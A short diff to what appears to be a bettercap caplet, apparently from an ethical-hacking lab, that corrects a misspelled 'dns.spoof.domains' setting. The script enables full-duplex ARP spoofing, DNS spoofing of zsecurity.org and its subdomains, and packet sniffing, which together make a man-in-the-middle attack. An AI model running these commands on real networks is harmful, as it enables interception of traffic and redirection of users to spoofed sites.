@@ -3,6 +3,6 @@ set arp.spoof.fullduplex true
 set arp.spoof.targets 
 arp.spoof on
 set dns.spoof.all true
-set dns.spoof.domians zsecurity.org,*.zsecurity.org
+set dns.spoof.domains zsecurity.org,*.zsecurity.org
 dns.spoof on
 net.sniff on
